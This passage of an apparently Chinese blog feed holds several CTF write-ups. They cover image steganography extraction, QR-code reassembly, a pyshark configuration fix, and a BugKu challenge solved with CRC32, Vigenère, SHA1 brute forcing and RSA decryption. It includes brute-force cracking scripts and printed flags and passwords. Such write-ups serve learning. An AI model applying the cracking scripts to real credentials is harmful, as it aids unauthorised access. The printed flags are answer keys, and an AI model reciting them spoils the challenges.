<span class="built_in">str</span>((channel &gt;&gt; <span class="number">4</span>) &amp; <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bin_str), <span class="number">8</span>):</span><br><span class="line">    number = <span class="built_in">int</span>(bin_str[i:i+<span class="number">8</span>], <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="number">32</span> &lt;= number &lt; <span class="number">127</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(number), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221110123505734.png" alt="image-20221110123505734"></p><br><h1 id="misc61"><a href="#misc61" class="headerlink" title="misc61"></a>misc61</h1><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221110122314627.png" alt="image-20221110122314627"></p><p>python代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&quot;./images/misc61.png&quot;</span>)</span><br><span class="line"></span><br><span class="line">bin_str = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(img.width):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(img.height):</span><br><span class="line">        rgb = img.getpixel((x, y))</span><br><span class="line">        <span class="keyword">for</span> channel <span class="keyword">in</span> rgb:</span><br><span class="line">            <span class="comment"># 65320:</span></span><br><span class="line">            <span class="comment"># 1111 1111</span></span><br><span class="line">            <span class="comment"># 7654 3210</span></span><br><span class="line">            bin_str += <span class="built_in">str</span>((channel &gt;&gt; <span class="number">6</span>) &amp; <span class="number">1</span>)</span><br><span class="line">            bin_str += <span class="built_in">str</span>((channel &gt;&gt; <span class="number">5</span>) &amp; <span class="number">1</span>)</span><br><span class="line">            bin_str += <span class="built_in">str</span>((channel &gt;&gt; <span class="number">3</span>) &amp; <span class="number">1</span>)</span><br><span class="line">            bin_str += <span class="built_in">str</span>((channel &gt;&gt; <span class="number">2</span>) &amp; <span class="number">1</span>)</span><br><span class="line">            bin_str += <span class="built_in">str</span>(channel &amp; <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bin_str), <span class="number">8</span>):</span><br><span class="line">    number = <span class="built_in">int</span>(bin_str[i:i+<span class="number">8</span>], <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="number">32</span> &lt;= number &lt; <span class="number">127</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(number), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221110123902807.png" alt="image-20221110123902807"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>[安洵杯 2019]：吹着贝斯扫二维码</title>
      <link href="/posts/1824.html"/>
      <url>/posts/1824.html</url>
      
        <content type="html"><![CDATA[<h1 id="安洵杯-2019-吹着贝斯扫二维码"><a href="#安洵杯-2019-吹着贝斯扫二维码" class="headerlink" title="[安洵杯 2019]吹着贝斯扫二维码"></a>[安洵杯 2019]吹着贝斯扫二维码</h1><ol><li><p>首先把图片移动到<code>image</code>目录中，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(<span class="string">&quot;.&quot;</span>):</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> file.endswith(<span class="string">&quot;.zip&quot;</span>) <span class="keyword">and</span> <span class="keyword">not</span> file.endswith(<span class="string">&quot;.py&quot;</span>):</span><br><span class="line">            shutil.copy(file, <span class="string">f&quot;./images/<span class="subst">&#123;file&#125;</span>.jpg&quot;</span>)</span><br></pre></td></tr></table></figure></li></ol><br><ol start="2"><li>随便打开一张图片，发现图片的序号了，一共有36张图片，拼图的难度太大了，我试了一下，我反正是拼不出来。我们根据序号写个代码自动拼图就好了。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221109202837190.png" alt="image-20221109202837190"></p><br><ol start="3"><li><p>拼图代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_img_path</span>(<span class="params">number</span>):</span><br><span class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(<span class="string">&quot;./images&quot;</span>):</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">            img_path = os.path.join(root, file)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(img_path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                data = f.read()</span><br><span class="line"></span><br><span class="line">            hex_str = binascii.b2a_hex(data[-<span class="number">4</span>:]).decode()</span><br><span class="line"></span><br><span class="line">            count = re.findall(<span class="string">&quot;ffd9(.*?)$&quot;</span>, hex_str)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(count) == <span class="number">2</span>:</span><br><span class="line">                ret = <span class="built_in">chr</span>(<span class="built_in">int</span>(count, <span class="number">16</span>))</span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">len</span>(count) == <span class="number">4</span>:</span><br><span class="line">                ret = <span class="string">&quot;&quot;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(count[i:i+<span class="number">2</span>], <span class="number">16</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(count), <span class="number">2</span>))</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(ret) == number:</span><br><span class="line">                <span class="keyword">return</span> img_path</span><br><span class="line"></span><br><span class="line">width = <span class="number">134</span></span><br><span class="line">height = <span class="number">130</span></span><br><span class="line">new_img = Image.new(<span class="string">&quot;RGB&quot;</span>, size=(<span class="number">134</span>*<span class="number">6</span>, <span class="number">130</span>*<span class="number">6</span>))</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">7</span>):</span><br><span class="line">        number = y * <span class="number">6</span> + x</span><br><span class="line">        img_path = get_img_path(number)</span><br><span class="line">        img = Image.<span class="built_in">open</span>(img_path)</span><br><span class="line">        new_img.paste(img, (width * (x - <span class="number">1</span>), height * y))</span><br><span class="line"></span><br><span class="line">new_img.show()</span><br></pre></td></tr></table></figure></li></ol><br><p>   4.扫描二维码<img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221109203054283.png" alt="image-20221109203054283"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BASE Family Bucket ??? 85-&gt;64-&gt;85-&gt;13-&gt;16-&gt;32</span><br></pre></td></tr></table></figure><p>没有base13的，所以猜测为rot13</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221109203155439.png" alt="image-20221109203155439"></p><p>复制这个然后使用解开：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221109203240480.png" alt="image-20221109203240480"></p><p>解压密码：<code>ThisIsSecret!233</code></p><p>解压flag.zip，拿到flag：<code>flag&#123;Qr_Is_MeAn1nGfuL&#125;</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF-[NSSRound#3 Team]：funnypng</title>
      <link href="/posts/49684.html"/>
      <url>/posts/49684.html</url>
      
        <content type="html"><![CDATA[<p>说明：这题我也是根据<a href="https://blog.csdn.net/gou1791241251/article/details/124809703">透明的胡萝卜_robots 的WP</a>，写一下我的理解加上复现。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221106183215763.png" alt="image-20221106183215763"></p><ol><li>先看属性是48bit，我们可以用opencv读一下，看看是几个通道的</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">img = cv2.imread(<span class="string">&quot;./funnypng.png&quot;</span>, cv2.IMREAD_UNCHANGED)</span><br><span class="line"><span class="built_in">print</span>(img.ndim)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">运行结果：</span><br><span class="line">3</span><br></pre></td></tr></table></figure><p><code>cv2.IMREAD_UNCHANGED</code> 表示，保持原图状态读取，如果你不加，那他只会读取8bit，这些小细节要注意。</p><p>根据运行结果3，我们就知道是RGB三个通道，再根据图片属性的48bit，也就是R和G和B每个通道占<code>48 / 3 = 16(bit)</code>，也就比正常情况的8bit多了8bit，首先你能理解这个地方，后面就比较好理解了。</p><br><ol start="2"><li><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221106183942389.png" alt="image-20221106183942389">我们</li></ol><p>使用stegsolve读取图片，发现图片的R通道的最低位隐写了一个二维码，由于这个工具只会读取图片的8bit，也就是说原图是16bit，我们的前8bit被读取了，发现了半个二维码，另外半个二维码，其实被出题人放到了后8bit里面，所以现在的目标就是提取后面的8bit；也就是00000000 &#x3D;&#x3D;00000000&#x3D;&#x3D;，我们要提取后8bit的。</p><p>  上才艺：</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">img = cv2.imread(<span class="string">&quot;./funnypng.png&quot;</span>, cv2.IMREAD_UNCHANGED)</span><br><span class="line"></span><br><span class="line">img2 = img &amp; <span class="number">0xFF</span></span><br><span class="line">img2 = img2.astype(np.uint8)</span><br><span class="line"></span><br><span class="line">cv2.imwrite(<span class="string">&quot;./fun.png&quot;</span>, img2)</span><br></pre></td></tr></table></figure>  <br><ol start="3"><li><p>后8bit已经被我们提取到了，所以说会opencv真的很爽，虽然我会的也不多，哈哈哈</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221106184523588.png" alt="image-20221106184523588"></p><p>可以看到后8bit的B通道的最后一位隐写了另一半二维码，我们拿到了另一半了。</p><br><p>用ps稍微处理一下：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221106184743331.png" alt="image-20221106184743331"></p></li></ol><p>这种被涂鸦的使用：QRazyBox</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221106184847571.png" alt="image-20221106184847571"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221106184858989.png" alt="image-20221106184858989"></p><p>找到二维码目录，导入二维码。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221106184957894.png" alt="image-20221106184957894"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221106185004254.png" alt="image-20221106185004254"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221106185012366.png" alt="image-20221106185012366"></p><h5 id="NSSCTF-fbef863db8331e8c63f73d7a04c1cf5b"><a href="#NSSCTF-fbef863db8331e8c63f73d7a04c1cf5b" class="headerlink" title="NSSCTF{fbef863db8331e8c63f73d7a04c1cf5b}"></a><strong>NSSCTF{fbef863db8331e8c63f73d7a04c1cf5b}</strong></h5><br><p>总结：出题人的思路是每个通道16bit，前8bit会默认被软件处理，后8bit不会被处理，所以就可以进行隐写，很有创意的题目~</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>wireshark和pyshark关于tshark.exe目录的问题</title>
      <link href="/posts/31832.html"/>
      <url>/posts/31832.html</url>
      
        <content type="html"><![CDATA[<p>报错内容：<br><code>pyshark.tshark.tshark.TSharkNotFoundException: TShark not found. Try adding its location to the configuration file. Searched these paths: [&#39;C:\\Program Files\\Wireshark\\tshark.exe&#39;, &#39;C:\\Program Files (x86)\\Wireshark\\tshark.exe&#39;, &#39;C:\\Program Files\\Wireshark\\tshark.exe&#39;]</code></p><br><p>出现该报错的主要原因是因为没有找到<code>tshark.exe</code>，没找到这个是因为你的<a href="https://so.csdn.net/so/search?q=wireshark&spm=1001.2101.3001.7020">wireshark</a>没有安装在默认路径，如果重新安装比较麻烦，我们可以去修改<code>config.ini</code>中的<code>tshark.exe</code>的路径。</p><br><p><code>config.ini</code>路径在python安装路径的<code>\Lib\site-packages\pyshark</code>中</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230131200057714.png" alt="image-20230131200057714"></p><p><code>修改前，我们先把原版备份一下，以备不时之需！</code></p><p><strong>原版：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[tshark]</span><br><span class="line"># Specify the path to the tshark executable.</span><br><span class="line"># If the configured path does not exist, these locations will be searched:</span><br><span class="line"># (Linux): /usr/bin/tshark</span><br><span class="line"># (Linux): /usr/sbin/tshark</span><br><span class="line"># (Linux): /usr/lib/tshark/tshark</span><br><span class="line"># (Linux): /usr/local/bin/tshark</span><br><span class="line"># (Windows): %ProgramFiles%\Wireshark\tshark.exe</span><br><span class="line"># (Windows): %ProgramFiles(x86)%\Wireshark\tshark.exe</span><br><span class="line">tshark_path = C:\Program Files\Wireshark\tshark.exe</span><br><span class="line"></span><br><span class="line">[dumpcap]</span><br><span class="line">dumpcap_path = C:\Program Files\Wireshark\dumpcap.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>修改后：</strong></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230131200135454.png" alt="image-20230131200135454"></p><p>简单的代码终于没有出现问题了</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230131200153835.png" alt="image-20230131200153835"></p><p>希望能解决大家的问题，拜拜！</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BUGKU-就五层你能解开吗？</title>
      <link href="/posts/47875.html"/>
      <url>/posts/47875.html</url>
      
        <content type="html"><![CDATA[<p>题目名称：就五层你能解开吗</p><p>题目来源：<a href="https://ctf.bugku.com/challenges/detail/id/45.html">BugKu</a></p><h1 id="1-CRC32"><a href="#1-CRC32" class="headerlink" title="1.CRC32"></a>1.CRC32</h1><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221028124948863.png" alt="image-20221028124948863"></p><ol><li><p>打开题目的压缩包发现需要密码，但是可以发现pwd1.txt ~ pwd3.txt，都是6字节，再加上里面的CRC32，让人很容易想到CRC32攻击手段。</p></li><li><p>我也有开源项目<a href="https://github.com/Byxs20/zip-crc-tools">zip-crc-tools</a>，但是是攻击zip文件的，由于这个是7z的文件，目前没有时间加入这个格式的文件，所以我们使用<a href="https://github.com/theonlypwner/crc32">theonlypwner&#x2F;crc32</a>，进行爆破明文，需要注意是的由于这个项目的默认爆破字符集里面没有一些特殊符号，所以我们必须要修改一下这个项目crc32.py的代码。</p></li></ol><p>修改<code>crc32.py</code>的字符集：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221028125418264.png" alt="image-20221028125418264"></p><ol start="3"><li>开始攻击，肉眼可以看出这个是比较有意义的字符串</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221028124925965.png" alt="image-20221028124925965"></p><ol start="4"><li>剩下的pwd2和pwd3的文本文件，使用上面的手段，就可以拿到明文了，然后组合在一起就是这个7z的密码了：<code>_CRC32_i5_n0t_s4f3</code></li></ol><br><h1 id="2-维吉尼亚"><a href="#2-维吉尼亚" class="headerlink" title="2.维吉尼亚"></a>2.维吉尼亚</h1><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221028125911240.png" alt="image-20221028125911240"></p><ol><li>根据tips.txt的提示，我们知道了，我们需要解密这个维吉尼亚明文。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221028130043769.png" alt="image-20221028130043769"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221028130009548.png" alt="image-20221028130009548"></p><ol start="2"><li><p>密文在cipher.txt，keys.txt里面有1000个密码，这种重复的事情，肯定是上代码喽</p></li><li><p>由于前几天，出了一个换26x26表的题目，所以我直接用我封装好的维吉尼亚脚本。</p><p>因为这个题目喊我们找密码，密码的英文<code>password</code>，但是维吉尼亚加解密的时候，会小写转换为大写，所以我们就爆破<code>keys.txt</code>里面的所有<code>key</code>，使用<code>PASSWORD</code>作为关键字就好了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> src <span class="keyword">import</span> Vigenere <span class="comment"># 使用的我是封装好了维吉尼亚加解密过程</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;ciphertext.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cipher_text = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;keys.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    keys = f.read()</span><br><span class="line">    keys = keys.splitlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;PASSWORD&quot;</span> <span class="keyword">in</span> (plan_text := Vigenere.Vigenere(key).decipher(cipher_text)):</span><br><span class="line">        <span class="built_in">print</span>(plan_text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">运行结果：</span><br><span class="line">THE VIGENERE CIPHER IS A METHOD OF ENCRYPTING ALPHABETIC TEXT BY USING A SERIES OF DIFFERENT CAESAR CIPHERS BASED ON THE LETTERS OF A KEYWORD IT IS A SIMPLE FORM OF POLYALPHABETIC SUBSTITUTION SO PASSWORD IS VIGENERE CIPHER FUNNY</span><br></pre></td></tr></table></figure><p>得到密码：<code>VIGENERE CIPHER FUNNY</code>，大写试过，没成功，所以我们使用小写<code>vigenere cipher funny</code>，成功解压出来了。</p></li></ol><br><h1 id="3-爆破SHA1"><a href="#3-爆破SHA1" class="headerlink" title="3.爆破SHA1"></a>3.爆破SHA1</h1><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221028131359229.png" alt="image-20221028131359229"></p><p>上代码即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 不完整密码: *7*5-*4*3?</span></span><br><span class="line"><span class="comment"># 不完整sha-1: 619c20c*a4de755*9be9a8b*b7cbfa5*e8b4365*</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.先定义几个字符集到时候使用</span></span><br><span class="line">str_digits = string.digits</span><br><span class="line">str_upper = string.ascii_uppercase</span><br><span class="line">str_lower = string.ascii_lowercase</span><br><span class="line">str_printable = string.printable</span><br><span class="line"></span><br><span class="line">password = <span class="string">&quot;%s7%s5-%s4%s3?&quot;</span></span><br><span class="line"><span class="keyword">for</span> chrs <span class="keyword">in</span> itertools.product(str_printable, repeat=<span class="number">4</span>):</span><br><span class="line">    pwd = password % chrs</span><br><span class="line">    <span class="keyword">if</span> (hash_str := hashlib.sha1(pwd.encode()).hexdigest()).startswith(<span class="string">&quot;619c20c&quot;</span>):</span><br><span class="line">        <span class="built_in">print</span>(pwd, hash_str)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">运行结果：</span><br><span class="line">s7v5-T4`3? 619c20c33dbeff190fab0d5498f0789e3ec1519a</span><br><span class="line">I7~5-s4F3? 619c20c4a4de75519be9a8b7b7cbfa54e8b4365b</span><br></pre></td></tr></table></figure><p>根据运行结果，我们成功拿到了解压密码<code>I7~5-s4F3?</code>，爆破速度也不慢，我就上个厕所回来就出来了。<br><br></p><h1 id="4-MD5"><a href="#4-MD5" class="headerlink" title="4.MD5"></a>4.MD5</h1><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221028133134047.png" alt="image-20221028133134047"></p><p>关于MD5校验，这个地方我之前看过关于MD5的视频：<a href="https://www.bilibili.com/video/BV1S541127qR/?spm_id_from=333.337.search-card.all.click&vd_source=60cf53bc00c2d4afa9b53e5b9232bdd2">哔哩哔哩-MD5为何不再安全</a>， 视频的11:55</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221028133351909.png" alt="image-20221028133351909"></p><p>使用选择前缀碰撞攻击，已经实现了一样的MD5，出输出了不一样的内容。感兴趣，可以看一下这个视频。</p><p>所以这一层的密码是:<code>Goodbye World :-(</code></p><br><h1 id="5-RSA"><a href="#5-RSA" class="headerlink" title="5.RSA"></a>5.RSA</h1><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221028133624268.png" alt="image-20221028133624268"></p><p>这一层，flag.enc我看了一下没有base64加密，我们写代码来解吧，这样以后碰到base64的也能变通。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.read flag.enc</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.enc&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read()</span><br><span class="line">    c = libnum.s2n(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.read pub_key</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;rsa_public_key.pem&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pub_key = RSA.import_key(f.read())</span><br><span class="line"></span><br><span class="line">n = pub_key.n</span><br><span class="line">e = pub_key.e</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.使用factordb查询的</span></span><br><span class="line">p = <span class="number">15991846970993213322072626901560749932686325766403404864023341810735319249066370916090640926219079368845510444031400322229147771682961132420481897362843199</span></span><br><span class="line">q = <span class="number">28805791771260259486856902729020438686670354441296247148207862836064657849735343618207098163901787287368569768472521344635567334299356760080507454640207003</span></span><br><span class="line"></span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = sympy.mod_inverse(e, phi_n)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(m))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">运行结果：</span><br><span class="line">b&#x27;\x02\xb3\xf3\xc6W8\xb5\x81S/cwr\xe8\xd3\xb5Cf\xe4\xe5w\x81h\t\x82\x8cd\x85D&#125;\xec7\xec!\xe4;\x89\xb3w\xa4Uf\xf5\xd9%\xcb\x96\x85\x10\x11B\x9a&lt;&quot;QS\x05\x84\x80&#123;\xb1.\x82\xcc\x1c\xf6\x87z@\x91\x9e\xf6h\xe7\xa1\x8f\x96\x9d%&amp;\xa4\xcd\xf0\&#x27;\x16J\xf4!\x9c\&#x27;h8!Y\xa1o(H\xea&#125;\x00flag&#123;W0rld_Of_Crypt0gr@phy&#125;&#x27;</span><br></pre></td></tr></table></figure><p>成功拿到FLAG：<strong>flag{W0rld_Of_Crypt0gr@phy}</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-高手进阶：tunnel</title>
      <link href="/posts/59154.html"/>
      <url>/posts/59154.html</url>
      
